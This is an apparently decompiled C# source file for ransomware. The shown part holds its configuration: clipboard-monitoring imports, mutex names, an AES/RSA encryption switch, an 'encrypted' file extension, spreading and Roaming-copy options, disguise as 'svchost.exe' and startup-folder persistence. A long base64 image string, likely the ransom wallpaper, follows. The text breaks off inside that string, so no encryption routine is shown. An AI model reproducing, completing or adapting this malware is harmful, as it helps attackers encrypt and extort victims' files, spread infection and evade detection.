using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "encrypted";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = false;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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